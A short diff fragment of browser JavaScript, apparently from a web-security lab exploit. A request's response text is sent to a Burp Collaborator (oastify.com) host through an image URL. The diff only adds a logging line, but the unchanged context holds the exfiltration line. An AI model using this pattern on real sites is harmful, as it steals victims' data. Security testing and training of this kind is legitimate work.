@@ -9,6 +9,7 @@
         req.send();
 
         function reqListener() {
+            console.log("Response received:", this.responseText);
             // Send the response data to your Burp Collaborator server
             var img = new Image();
             img.src = 'https://dr8gpzq0tx3iayklyxuapotqwh28qzhn6.oastify.com/?data=' + encodeURIComponent(this.responseText);
